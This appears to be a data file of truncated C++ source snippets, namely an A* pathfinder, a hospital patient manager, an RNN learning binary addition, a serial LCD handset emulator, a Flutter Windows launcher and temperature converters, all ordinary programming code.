Map[i] = new Map_Cell[N];\r\n        getline(file, line);\r\n        stringstream ss(line);\r\n        int cell_type;\r\n        for(int j = 0; j < N; j++)\r\n        {\r\n            ss >> cell_type;\r\n            Map[i][j].type = cell_type;\r\n            if(cell_type == 3)\r\n            {\r\n                start_point = {i, j};\r\n            }\r\n            else if(cell_type == 4)\r\n            {\r\n                end_point = {i, j};\r\n            }\r\n        }\r\n    }\r\n\r\n    // A*\u641c\u7d22\u521d\u59cb\u5316\r\n    priority_queue<Search_Cell*, vector<Search_Cell*>, CompareF> open_list;\r\n    map<pair<int, int>, Search_Cell*> all_cells;\r\n\r\n    Search_Cell *start_cell = new Search_Cell(start_point.first, start_point.second, 0, Heuristic_Function(start_point.first, start_point.second, end_point.first, end_point.second));\r\n    open_list.push(start_cell);\r\n    all_cells[{start_point.first, start_point.second}] = start_cell;\r\n\r\n    bool found = false;\r\n    Search_Cell* current;\r\n    while(!open_list.empty() && !found)\r\n    {\r\n        current = open_list.top();\r\n        open_list.pop();\r\n\r\n        // \u5230\u8fbe\u7ec8\u70b9\r\n        if (current->x == end_point.first && current->y == end_point.second) {\r\n            found = true;\r\n            break;\r\n        }\r\n\r\n        // \u6269\u5c55\u5f53\u524d\u8282\u70b9\r\n        const vector<pair<int, int>> directions{{0, 1}, {1, 0}, {0, -1}, {-1, 0}}; // \u56db\u4e2a\u53ef\u80fd\u7684\u79fb\u52a8\u65b9\u5411\r\n        for (const auto& dir : directions) {\r\n            int new_x = current->x + dir.first;\r\n            int new_y = current->y + dir.second;\r\n\r\n            if (new_x >= 0 && new_x < M && new_y >= 0 && new_y < N && Map[new_x][new_y].type != 1) { // \u786e\u4fdd\u5728\u8303\u56f4\u5185\u4e14\u4e0d\u662f\u969c\u788d\r\n                int new_g = current->g + 1;\r\n                int new_h = Heuristic_Function(new_x, new_y, end_point.first, end_point.second);\r\n                auto new_cell = new Search_Cell(new_x, new_y, new_g, new_h, current);\r\n\r\n                if (all_cells.find({new_x, new_y}) == all_cells.end() || new_g < all_cells[{new_x, new_y}]->g) { // \u53d1\u73b0\u66f4\u77ed\u7684\u8def\u5f84\r\n                    all_cells[{new_x, new_y}] = new_cell;\r\n                    open_list.push(new_cell);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    // \u6784\u5efa\u8def\u5f84\r\n    if (found) {\r\n        vector<char> path;\r\n        while (current != nullptr && current->parent != nullptr) {\r\n            if (current->x == current->parent->x + 1) path.push_back('D');\r\n            else if (current->x == current->parent->x - 1) path.push_back('U');\r\n            else if (current->y == current->parent->y + 1) path.push_back('R');\r\n            else if (current->y == current->parent->y - 1) path.push_back('L');\r\n            current = current->parent;\r\n        }\r\n        reverse(path.begin(), path.end());\r\n        step_nums = path.size();\r\n        way = string(path.begin(), path.end());\r\n    } else {\r\n        step_nums = -1;\r\n        way = \"\";\r\n    }\r\n\r\n    // \u91ca\u653e\u52a8\u6001\u5185\u5b58\r\n    for (auto& cell : all_cells) {\r\n        delete cell.second;\r\n    }\r\n    for(int i = 0; i < M; i++) {\r\n        delete[] Map[i];\r\n    }\r\n    delete[] Map;\r\n}\r\n\r\nvoid output(const string output_file, int &step_nums, string &way)\r\n{\r\n    ofstream file(output_file);\r\n    if(file.is_open())\r\n    {\r\n        file << step_nums << endl;\r\n        if(step_nums >= 0)\r\n        {\r\n            file << way << endl;\r\n        }\r\n\r\n        file.close();\r\n    }\r\n    else\r\n    {\r\n        cerr << \"Can not open file: \" << output_file << endl;\r\n    }\r\n}\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n    string input_base = \"../input/input_\";\r\n    string output_base = \"../output/output_\";\r\n    // input_0\u4e3a\u8bb2\u4e49\u6837\u4f8b\uff0c\u6b64\u5904\u4e0d\u505a\u6d4b\u8bd5\r\n    for(int i = 1; i < 11; i++)\r\n    {\r\n        int step_nums = -1;\r\n        string",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n\nusing namespace std;\n\nclass Hospital {\nprivate:\n    string Name, Address, BloodGrp, Age;\n\npublic:\n    // Constructor\n    Hospital() {\n        Name = \"Empty\";\n        Address = \"Empty\";\n        BloodGrp = \"Empty\";\n        Age = \"Empty\";\n    }\n\n    Hospital(string name, string address, string bloodGrp, string age) {\n        Name = name;\n        Address = address;\n        BloodGrp = bloodGrp;\n        Age = age;\n    }\n\n    // Setters\n    void setName(string name) { Name = name; }\n    void setAddress(string address) { Address = address; }\n    void setBloodGrp(string bloodGrp) { BloodGrp = bloodGrp; }\n    void setAge(string age) { Age = age; }\n\n    // Getters\n    string getName() const { return Name; }\n    string getAddress() const { return Address; }\n    string getBloodGrp() const { return BloodGrp; }\n    string getAge() const { return Age; }\n};\n\n// function to read patient data from file\nvector<Hospital> readPatientsFromFile() {\n    vector<Hospital> patients;\n    ifstream fileIn(\"patients.txt\");\n    if (!fileIn.is_open()) {\n        cout << \"File does not exist!\";\n        return patients;\n    }\n\n    string line;\n    while (getline(fileIn, line)) {\n        stringstream ss(line);\n        string name, address, bloodGrp, age;\n        getline(ss, name, '|');\n        getline(ss, address, '|');\n        getline(ss, bloodGrp, '|');\n        getline(ss, age);\n        patients.push_back(Hospital(name, address, bloodGrp, age));\n    }\n    fileIn.close();\n    return patients;\n}\n\n// function to write patient data to file\nvoid writePatientsToFile(const vector<Hospital>& patients) {\n    ofstream fileOut(\"patients.txt\");\n    if (!fileOut.is_open()) {\n        cout << \"File does not exist!\";\n        return;\n    }\n\n    for (size_t i = 0; i < patients.size(); ++i) {\n        const auto& patient = patients[i];\n        fileOut << patient.getName() << \"|\" << patient.getAddress() << \"|\" << patient.getBloodGrp() << \"|\" << patient.getAge() << endl;\n    }\n\n    fileOut.close();\n}\n\n// function to admit a patient\nvoid admitPatient(vector<Hospital>& patients) {\n    string name, address, bloodGrp, age;\n\n    cout << \"\\t Enter Patient Name: \";\n    cin.ignore();\n    getline(cin, name);\n\n    cout << \"\\t Enter Patient Address: \";\n    getline(cin, address);\n\n    cout << \"\\t Enter Patient Blood Group: \";\n    getline(cin, bloodGrp);\n\n    cout << \"\\t Enter Patient Age: \";\n    getline(cin, age);\n\n    // Create a new patient object and add it to the vector\n    Hospital newPatient(name, address, bloodGrp, age);\n    patients.push_back(newPatient);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n\n    cout << \"\\n\\t Patient Data Saved Successfully!!!\\n\" << endl;\n}\n\n// function to discharge a patient\nvoid dischargePatient(vector<Hospital>& patients) {\n    if (patients.empty()) {\n        cout << \"No patients to discharge!\" << endl;\n        return;\n    }\n\n    cout << \"\\t List of Patients:\" << endl;\n    for (size_t i = 0; i < patients.size(); ++i) {\n        cout << \"\\t \" << i + 1 << \". \" << patients[i].getName() << endl;\n    }\n\n    int choice;\n    cout << \"\\t Enter the number of the patient to discharge: \";\n    cin >> choice;\n\n    if (choice < 1 || choice > static_cast<int>(patients.size())) {\n        cout << \"\\t Invalid choice!\" << endl;\n        return;\n    }\n\n    cout << \"\\n\\t The Patient \" << patients[choice - 1].getName() << \", is Discharged!!!\\n\" << endl;\n\n    // Erase the discharged patient from the vector\n    patients.erase(patients.begin() + choice - 1);\n\n    // Update the file with the modified list of patients\n    writePatientsToFile(patients);\n}\n\nint main() {\n    bool isExit = false;\n    vector<Hospital> patients;\n\n    // Load patients from file\n    patients = readPatientsFromFile();\n\n    while (!isExit) {\n        system(\"cls\");\n\n        int userVal;\n        cout << \"\\t ~ Hospital Management System ~\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t 1. Admit Patient\" << endl;\n        cout << \"\\t 2. Discharge Patient\" << endl;\n        cout << \"\\t 3. See All Patients\" << endl;\n        cout << \"\\t 4. About Us\" << endl;\n        cout << \"\\t 5. Contact Info\" << endl;\n        cout << \"\\t 6. Exit\" << endl;\n        cout << \"\\t ===============================\" << endl << endl;\n\n        cout << \"\\t Enter your choice: \";\n        cin >> userVal;\n\n        switch (userVal) {\n            case 1:\n                system(\"cls\");\n                admitPatient(patients);\n                system(\"pause\");\n                break;\n            case 2:\n                system(\"cls\");\n                dischargePatient(patients);\n                system(\"pause\");\n                break;\n            case 3:\n                system(\"cls\");\n                // Display all patients\n                for (size_t i = 0; i < patients.size(); ++i) {\n                    const auto& patient = patients[i];\n                    cout << ",
    "//\u8ba9\u7a0b\u5e8f\u81ea\u5df1\u5b66\u4f1a\u662f\u5426\u9700\u8981\u8fdb\u4f4d\uff0c\u4ece\u800c\u5b66\u4f1a\u52a0\u6cd5\n\n#include \"iostream\"\n#include \"math.h\"\n#include \"stdlib.h\"\n#include \"time.h\"\n#include \"vector\"\n#include \"assert.h\"\nusing namespace std;\n\n#define innode  2       //\u8f93\u5165\u7ed3\u70b9\u6570\uff0c\u5c06\u8f93\u51652\u4e2a\u52a0\u6570\n#define hidenode  16    //\u9690\u85cf\u7ed3\u70b9\u6570\uff0c\u5b58\u50a8\u201c\u643a\u5e26\u4f4d\u201d\n#define outnode  1      //\u8f93\u51fa\u7ed3\u70b9\u6570\uff0c\u5c06\u8f93\u51fa\u4e00\u4e2a\u9884\u6d4b\u6570\u5b57\n#define alpha  0.1      //\u5b66\u4e60\u901f\u7387\n#define binary_dim 8    //\u4e8c\u8fdb\u5236\u6570\u7684\u6700\u5927\u957f\u5ea6\n\n#define randval(high) ( (double)rand() / RAND_MAX * high )\n#define uniform_plus_minus_one ( (double)( 2.0 * rand() ) / ((double)RAND_MAX + 1.0) - 1.0 )  //\u5747\u5300\u968f\u673a\u5206\u5e03\n\n\nint largest_number = ( pow(2, binary_dim) );  //\u8ddf\u4e8c\u8fdb\u5236\u6700\u5927\u957f\u5ea6\u5bf9\u5e94\u7684\u53ef\u4ee5\u8868\u793a\u7684\u6700\u5927\u5341\u8fdb\u5236\u6570\n\n//\u6fc0\u6d3b\u51fd\u6570\ndouble sigmoid(double x) \n{\n    return 1.0 / (1.0 + exp(-x));\n}\n\n//\u6fc0\u6d3b\u51fd\u6570\u7684\u5bfc\u6570\uff0cy\u4e3a\u6fc0\u6d3b\u51fd\u6570\u503c\ndouble dsigmoid(double y)\n{\n    return y * (1 - y);  \n}           \n//\u5c06\u4e00\u4e2a10\u8fdb\u5236\u6574\u6570\u8f6c\u6362\u4e3a2\u8fdb\u5236\u6570\nvoid int2binary(int n, int *arr)\n{\n    int i = 0;\n    while(n)\n    {\n        arr[i++] = n % 2;\n        n /= 2;\n    }\n    while(i < binary_dim)\n        arr[i++] = 0;\n}\n\nclass RNN\n{\npublic:\n    RNN();\n    virtual ~RNN();\n    void train();\n\npublic:\n    double w[innode][hidenode];        //\u8fde\u63a5\u8f93\u5165\u5c42\u4e0e\u9690\u85cf\u5c42\u7684\u6743\u503c\u77e9\u9635\n    double w1[hidenode][outnode];      //\u8fde\u63a5\u9690\u85cf\u5c42\u4e0e\u8f93\u51fa\u5c42\u7684\u6743\u503c\u77e9\u9635\n    double wh[hidenode][hidenode];     //\u8fde\u63a5\u524d\u4e00\u65f6\u523b\u7684\u9690\u542b\u5c42\u4e0e\u73b0\u5728\u65f6\u523b\u7684\u9690\u542b\u5c42\u7684\u6743\u503c\u77e9\u9635\n\n    double *layer_0;       //layer 0 \u8f93\u51fa\u503c\uff0c\u7531\u8f93\u5165\u5411\u91cf\u76f4\u63a5\u8bbe\u5b9a\n    //double *layer_1;     //layer 1 \u8f93\u51fa\u503c\n    double *layer_2;       //layer 2 \u8f93\u51fa\u503c\n};\n\nvoid winit(double w[], int n) //\u6743\u503c\u521d\u59cb\u5316\n{\n    for(int i=0; i<n; i++)\n        w[i] = uniform_plus_minus_one;  //\u5747\u5300\u968f\u673a\u5206\u5e03\n}\n\nRNN::RNN()\n{\n    layer_0 = new double[innode];\n    layer_2 = new double[outnode];\n    winit((double*)w, innode * hidenode);\n    winit((double*)w1, hidenode * outnode);\n    winit((double*)wh, hidenode * hidenode);\n}\n\nRNN::~RNN()\n{\n    delete layer_0;\n    delete layer_2;\n}\n\nvoid RNN::train()\n{\n    int epoch, i, j, k, m, p;\n    vector<double*> layer_1_vector;      //\u4fdd\u5b58\u9690\u85cf\u5c42\n    vector<double> layer_2_delta;        //\u4fdd\u5b58\u8bef\u5dee\u5173\u4e8eLayer 2 \u8f93\u51fa\u503c\u7684\u504f\u5bfc\n\n    for(epoch=0; epoch<10000; epoch++)  //\u8bad\u7ec3\u6b21\u6570\n    {\n        double e = 0.0;  //\u8bef\u5dee\n        for(i=0; i<layer_1_vector.size(); i++)\n            delete layer_1_vector[i];\n        layer_1_vector.clear();\n        layer_2_delta.clear();\n\n        int d[binary_dim];                    //\u4fdd\u5b58\u6bcf\u6b21\u751f\u6210\u7684\u9884\u6d4b\u503c\n        memset(d, 0, sizeof(d));\n\n        int a_int = (int)randval(largest_number/2.0);  //\u968f\u673a\u751f\u6210\u4e00\u4e2a\u52a0\u6570 a\n        int a[binary_dim];\n        int2binary(a_int, a);                 //\u8f6c\u4e3a\u4e8c\u8fdb\u5236\u6570\n\n        int b_int = (int)randval(largest_number/2.0);  //\u968f\u673a\u751f\u6210\u53e6\u4e00\u4e2a\u52a0\u6570 b\n        int b[binary_dim];\n        int2binary(b_int, b);                 //\u8f6c\u4e3a\u4e8c\u8fdb\u5236\u6570\n\n        int c_int = a_int + b_int;            //\u771f\u5b9e\u7684\u548c c\n        int c[binary_dim];\n        int2binary(c_int, c);                 //\u8f6c\u4e3a\u4e8c\u8fdb\u5236\u6570\n\n        double *layer_1 = new double[hidenode];   \n        for(i=0; i<hidenode; i++)         //\u57280\u65f6\u523b\u662f\u6ca1\u6709\u4e4b\u524d\u7684\u9690\u542b\u5c42\u7684\uff0c\u6240\u4ee5\u521d\u59cb\u5316\u4e00\u4e2a\u5168\u4e3a0\u7684\n            layer_1[i] = 0;\n        layer_1_vector.push_back(layer_1);  \n\n        //\u6b63\u5411\u4f20\u64ad\n        for(p=0; p<binary_dim; p++)           //\u5faa\u73af\u904d\u5386\u4e8c\u8fdb\u5236\u6570\u7ec4\uff0c\u4ece\u6700\u4f4e\u4f4d\u5f00\u59cb\n        {\n            layer_0[0] = a[p];\n            layer_0[1] = b[p];\n            double y = (double)c[p];          //\u5b9e\u9645\u503c\n            layer_1 = new double[hidenode];   //\u5f53\u524d\u9690\u542b\u5c42\n\n            for(j=0; j<hidenode; j++)\n            {\n                //\u8f93\u5165\u5c42\u4f20\u64ad\u5230\u9690\u542b\u5c42\n                double o1 = 0.0;\n                for(m=0; m<innode; m++)  \n                    o1 += layer_0[m] * w[m][j]; \n\n                //\u4e4b\u524d\u7684\u9690\u542b\u5c42\u4f20\u64ad\u5230\u73b0\u5728\u7684\u9690\u542b\u5c42\n                double *layer_1_pre = layer_1_vector.back();\n                for(m=0; m<hidenode; m++)\n                    o1 += layer_1_pre[m] * wh[m][j];\n\n                layer_1[j] = sigmoid(o1);      //\u9690\u85cf\u5c42\u5404\u5355\u5143\u8f93\u51fa\n            }\n\n            for(k=0; k<outnode; k++)\n            {\n                //\u9690\u85cf\u5c42\u4f20\u64ad\u5230\u8f93\u51fa\u5c42\n                double o2 = 0.0;\n                for(j=0; j<hidenode; j++)\n                    o2 += layer_1[j] * w1[j][k];              \n                layer_2[k] = sigmoid(o2);          //\u8f93\u51fa\u5c42\u5404\u5355\u5143\u8f93\u51fa\n            }\n\n            d[p] = (int)floor(layer_2[0] + 0.5);   //\u8bb0\u5f55\u9884\u6d4b\u503c\n            layer_1_vector.push_back(layer_1);     //\u4fdd\u5b58\u9690\u85cf\u5c42\uff0c\u4ee5\u4fbf\u4e0b\u6b21\u8ba1\u7b97\n\n            //\u4fdd\u5b58\u6807\u51c6\u8bef\u5dee\u5173\u4e8e\u8f93\u51fa\u5c42\u7684\u504f\u5bfc\n            layer_2_delta.push_back( (y - layer_2[0]) * dsigmoid(layer_2[0]) );\n            e += fabs(y - layer_2[0]);          //\u8bef\u5dee\n        }\n\n        //\u8bef\u5dee\u53cd\u5411\u4f20\u64ad\n\n        //\u9690\u542b\u5c42\u504f\u5dee\uff0c\u901a\u8fc7\u5f53\u524d\u4e4b\u540e\u4e00\u4e2a\u65f6\u95f4\u70b9\u7684\u9690\u542b\u5c42\u8bef\u5dee\u548c\u5f53\u524d\u8f93\u51fa\u5c42\u7684\u8bef\u5dee\u8ba1\u7b97\n        double *layer_1_delta = new double[hidenode];  \n        double *layer_1_future_delta = new double[hidenode];   //\u5f53\u524d\u65f6\u95f4\u4e4b\u540e\u7684\u4e00\u4e2a\u9690\u85cf\u5c42\u8bef\u5dee\n        for(j=0; j<hidenode; j++)\n            layer_1_future_delta[j] = 0;\n        for(p=binary_dim-1; p>=0 ; p--)\n        {\n            layer_0[0] = a[p];\n            layer_0[1] = b[p];\n\n            layer_1 = layer_1_vector[p+1];     //\u5f53\u524d\u9690\u85cf\u5c42\n            double *layer_1_pre = layer_1_vector[p];   //\u524d\u4e00\u4e2a\u9690\u85cf\u5c42\n\n            for(k=0; k<outnode; k++)  //\u5bf9\u4e8e\u7f51\u7edc\u4e2d\u6bcf\u4e2a\u8f93\u51fa\u5355\u5143\uff0c\u66f4\u65b0\u6743\u503c\n            {\n                //\u66f4\u65b0\u9690\u542b\u5c42\u548c\u8f93\u51fa\u5c42\u4e4b\u95f4\u7684\u8fde\u63a5\u6743\n                for(j=0; j<hidenode; j++)\n                    w1[j][k] += alpha * layer_2_delta[p] * layer_1[j];  \n            }\n\n            for(j=0; j<hidenode; j++) //\u5bf9\u4e8e\u7f51\u7edc\u4e2d\u6bcf\u4e2a\u9690\u85cf\u5355\u5143\uff0c\u8ba1\u7b97\u8bef\u5dee\u9879\uff0c\u5e76\u66f4\u65b0\u6743\u503c\n            {\n                l",
    "#include <SDL2/SDL.h>\n#undef main\n#include <stdio.h>\n#include <iostream>\n#include <fstream>\n#include \"command_args.h\"\n#include \"lcd.h\"\n#include <mutex>\n#include <Windows.h>\n\nstd::mutex lcdMtx;\n\ninline uint8_t hexDecode(char c) {\n    if (c >= '0' && c <= '9') {\n        return c - '0';\n    }\n    else if (c >= 'A' && c <= 'F') {\n        return c - 'A' + 0xA;\n    }\n    else if (c >= 'a' && c <= 'f') {\n        return c - 'a' + 0xA;\n    }\n    return 0xFF;\n}\n\nvoid serialWorker(std::string port, LCD* lcd) {\n    // Open port\n    HANDLE iface = CreateFileA(\n        \"\\\\\\\\.\\\\COM16\", // TODO: Use port\n        GENERIC_READ | GENERIC_WRITE,\n        0,\n        0,\n        OPEN_EXISTING,\n        FILE_ATTRIBUTE_NORMAL,\n        0\n    );\n\n    // Configure port\n    DCB dcb = {0};\n    dcb.DCBlength=sizeof(dcb);\n    if (!GetCommState(iface, &dcb)) {\n        printf(\"Could not get port config\\n\");\n        return;\n    }\n    dcb.BaudRate=CBR_115200;\n    dcb.ByteSize=8;\n    dcb.Parity=NOPARITY;\n    dcb.StopBits=ONESTOPBIT;\n    if(!SetCommState(iface, &dcb)){\n        printf(\"Could not set port config\\n\");\n        return;\n    }\n\n    printf(\"Started\\n\");\n\n    std::string line;\n    while (true) {\n        // Read a line\n        line.clear();\n        char c;\n        DWORD bread = 0;\n        while (true) {\n            if (!ReadFile(iface, &c, 1, &bread, NULL)) {\n                printf(\"Some fucking shit happened: %d\\n\", GetLastError());\n                break;\n            }\n            if (c == '\\n' || bread <= 0) { break; }\n            if (bread) { line += c; }\n            else {\n                printf(\"Read failed\\n\");\n            }\n        }\n\n        // If error, break out\n        if (bread <= 0) {\n            printf(\"Read failed: %d\\n\", bread);\n            break;\n        }\n\n        // Extract bytes\n        bool nextEscaped = false;\n        std::vector<uint8_t> packet;\n        for (int i = 18; i < line.size(); i += 2) {\n            printf(\"%c%c\", line[i], line[i+1]);\n\n            // Break if an unexpected char is present\n            if (!std::isxdigit(line[i]) || !std::isxdigit(line[i+1])) { break; }\n\n            // Decode byte\n            uint8_t byte = (hexDecode(line[i]) << 4) | hexDecode(line[i+1]);\n\n            // If the last byte was escaped, write the unescaped version\n            if (nextEscaped) {\n                packet.push_back(byte ^ (1 << 5));\n                nextEscaped = false;\n                continue;\n            }\n\n            // Check for escapement\n            if (byte == 0x7D) {\n                nextEscaped = true;\n                continue;\n            }\n\n            // Append byte\n            packet.push_back(byte);\n        }\n        printf(\"\\n\");\n\n        if (line[0] == '>' && packet[0] == 0xFA && packet[1] == 0x08 && packet[2] == 0x80) {\n            int page = packet[3] % 4;\n            int col = packet[4] & 0x7F;\n            {\n                std::lock_guard lck(lcdMtx);\n                lcd->blit(page, col, &(packet.data())[5], packet.size() - 7);\n            }\n        }\n        else if (line[0] == '>') {\n            printf(\"RF -> HS: \");\n            for (int i = 0; i < packet.size() - 2; i++) {\n                printf(\"%02X \", packet[i]);\n            }\n            printf(\"\\n\");\n        }\n        else {\n            printf(\"HS -> RF: \");\n            for (int i = 0; i < packet.size() - 2; i++) {\n                printf(\"%02X \", packet[i]);\n            }\n            printf(\"\\n\");\n        }\n    }\n}\n\nint main(int argc, char* argv[]) {\n    // Parse arguments\n    CommandArgsParser cargs;\n    cargs.define('c', \"com\", \"Serial port\", \"\");\n    cargs.parse(argc, argv);\n\n    // Check that a rom was given\n    if (cargs[\"com\"].s().empty()) {\n        fprintf(stderr, \"No COM port given!\\n\");\n        return -1;\n    }\n\n    // Init LCD\n    LCD lcd(98, 32, 11, 1, 24, 0xFF8DCD05, 0xFF78B801, 0xFF246300);\n    int fbWidth = lcd.getFBWidth();\n    int fbHeight = lcd.getFBHeight();\n\n    // Init SDL\n    SDL_Init(SDL_INIT_EVERYTHING);\n    SDL_Window* win = SDL_CreateWindow(\"CODAN Handset Emulator\", 100, 100, fbWidth, fbHeight, SDL_WINDOW_SHOWN);\n    SDL_Renderer* ren = SDL_CreateRenderer(win, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);\n    SDL_Texture * tex = SDL_CreateTexture(ren, SDL_PIXELFORMAT_ARGB8888, SDL_TEXTUREACCESS_STATIC, fbWidth, fbHeight);\n\n    // Start serial worker\n    std::thread workerThread(serialWorker, cargs[\"com\"].s(), &lcd);\n\n    // Mais loop\n    uint64_t lastTime = SDL_GetTicks();\n    bool running = true;\n    int frame = 0;\n    while (running) {\n        // Check for any event\n        SDL_Event event;\n        while (SDL_PollEvent(&event)) {\n            if (event.type == SDL_EventType::SDL_KEYDOWN) {\n                // TODO\n            }\n            else if (event.type == SDL_EventType::SDL_KEYUP) {\n                // TODO\n            }\n            else if (event.type == SDL_EventType::SDL_QUIT) {\n                running = false;\n            }\n        }\n\n        // Draw framebuffer\n        {\n            std::loc",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_ex\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//Option 9: Temperature option 1\r\ndouble celsiustofahrenheit(double celsius)\r\n{\r\n\tcout << \"enter value in celsius: \";\r\n\tdouble fahrenheit;\r\n\tcin >> celsius;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in celsius: \";\r\n\t\tcin >> celsius;\r\n\t}\r\n\tfahrenheit = celsius * 9 / 5 + 32;\r\n\tcout << fahrenheit << \" \\370f.\" << endl;\r\n\treturn fahrenheit;\r\n}\r\ndouble celsiustokelvin(double celsius)\r\n{\r\n\tcout << \"enter value in celsius: \";\r\n\tdouble kelvin;\r\n\tcin >> celsius;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in celsius: \";\r\n\t\tcin >> celsius;\r\n\t}\r\n\tkelvin = celsius + 273.15;\r\n\tcout << kelvin << \" kelvin.\" << endl;\r\n\treturn kelvin;\r\n}\r\ndouble celsiustorankine(double celsius)\r\n{\r\n\tcout << \"enter value in celsius: \";\r\n\tdouble rankine;\r\n\tcin >> celsius;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in celsius: \";\r\n\t\tcin >> celsius;\r\n\t}\r\n\trankine = (celsius + 273.15) * 9 / 5;\r\n\tcout << rankine << \" \\370ra.\" << endl;\r\n\treturn rankine;\r\n}\r\ndouble celsiustoreaumur(double celsius)\r\n{\r\n\tcout << \"enter value in celsius: \";\r\n\tdouble reaumur;\r\n\tcin >> celsius;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in celsius: \";\r\n\t\tcin >> celsius;\r\n\t}\r\n\treaumur = celsius * 0.8;\r\n\tcout << reaumur << \" \\370re.\" << endl;\r\n\treturn reaumur;\r\n}\r\n//temperature option 2\r\ndouble fahrenheittocelsius(double fahrenheit)\r\n{\r\n\tcout << \"enter value in fahrenheit: \";\r\n\tdouble celsius;\r\n\tcin >> fahrenheit;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in fahrenheit: \";\r\n\t\tcin >> fahrenheit;\r\n\t}\r\n\tcelsius = (fahrenheit - 32) * 5 / 9;\r\n\tcout << celsius << \" \\370c.\" << endl;\r\n\treturn celsius;\r\n}\r\ndouble fahrenheittokelvin(double fahrenheit)\r\n{\r\n\tcout << \"enter value in fahrenheit: \";\r\n\tdouble kelvin;\r\n\tcin >> fahrenheit;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in fahrenheit: \";\r\n\t\tcin >> fahrenheit;\r\n\t}\r\n\tkelvin = (fahrenheit + 459.67) * 5 / 9;\r\n\tcout << kelvin << \" kelvin.\" << endl;\r\n\treturn kelvin;\r\n}\r\ndouble fahrenheittorankine(double fahrenheit)\r\n{\r\n\tcout << \"enter value in fahrenheit: \";\r\n\tdouble rankine;\r\n\tcin >> fahrenheit;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in fahrenheit: \";\r\n\t\tcin >> fahrenheit;\r\n\t}\r\n\trankine = (fahrenheit + 459.67);\r\n\tcout << rankine << \" \\370ra.\" << endl;\r\n\treturn rankine;\r\n}\r\ndouble fahrenheittoreaumur(double fahrenheit)\r\n{\r\n\tcout << \"enter value in fahrenheit: \";\r\n\tdouble reaumur;\r\n\tcin >> fahrenheit;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in fahrenheit: \";\r\n\t\tcin >> fahrenheit;\r\n\t}\r\n\treaumur = (fahrenheit - 32) / 2.25;\r\n\tcout << reaumur << \" \\370re.\" << endl;\r\n\treturn reaumur;\r\n}\r\n//temperature option 3\r\ndouble kelvintocelsius(double kelvin)\r\n{\r\n\tcout << \"enter value in kelvin: \";\r\n\tdouble celsius;\r\n\tcin >> kelvin;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in kelvin: \";\r\n\t\tcin >> kelvin;\r\n\t}\r\n\tcelsius = (kelvin - 273.15);\r\n\tcout << celsius << \" \\370c.\" << endl;\r\n\treturn celsius;\r\n}\r\ndouble kelvintofahrenheit(double kelvin)\r\n{\r\n\tcout << \"enter value in kelvin: \";\r\n\tdouble fahrenheit;\r\n\tcin >> kelvin;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in kelvin: \";\r\n\t\tcin >> kelvin;\r\n\t}\r\n\tfahrenheit = (kelvin * 9 / 5 - 459.67);\r\n\tcout << fahrenheit << \" \\370f.\" << endl;\r\n\treturn fahrenheit;\r\n}\r\ndouble kelvintorankine(double kelvin)\r\n{\r\n\tcout << \"enter value in kelvin: \";\r\n\tdouble rankine;\r\n\tcin >> kelvin;\r\n\twhile (!cin || cin.fail())\r\n\t{\r\n\t\tcin.clear();\r\n\t\tstring junk;\r\n\t\tgetline(cin, junk);\r\n\t\tcout << \"enter value in kelvin: \";\r\n\t\tcin >> kelvin;\r\n\t}\r\n\trankine = kelvin * 1.8;\r\n\tcout << rankine << 